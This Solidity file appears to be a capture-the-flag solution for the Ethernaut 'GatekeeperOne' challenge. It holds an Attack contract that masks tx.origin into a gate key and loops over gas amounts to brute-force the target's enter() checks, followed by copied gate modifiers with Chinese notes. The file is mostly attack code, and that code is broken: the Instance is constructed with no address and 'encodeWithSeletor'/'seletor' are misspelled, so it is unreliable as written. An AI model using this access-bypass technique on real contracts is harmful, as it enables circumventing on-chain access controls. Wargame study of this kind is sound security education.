// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface Instance {

    function enter(bytes8 _gateKey) external returns (bool);
}

contract Attack {

Instance instance = Instance();

function attack() public {

        bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
        for(uint i = 0; i < 300; ++i) {
            (bool success, ) = address(instance).call{gas: i + 8191 * 5}(abi.encodeWithSeletor(Instance.enter.seletor, key));
            if(success) {
                break;
            }
        }
    }

}

/**
 
modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
} 要用合约呼叫另外一张合约

modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
} 用剩的gas % 8191 == 0

modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
}

uint32(uint64(_gateKey)) == uint16(uint64(_gateKey) 0xFFFFFFFF == 0x0000FFFF
uint32(uint64(_gateKey)) != uint64(_gateKey) 0x00000000FFFFFFFF != 0xFFFFFFFFFFFFFFFF 
uint32(uint64(_gateKey)) == uint16(uint160(tx.origin) 要求tx.origin

0x00000000FFFFFFFF & 0xFFFFFFFF0000FFFF
 */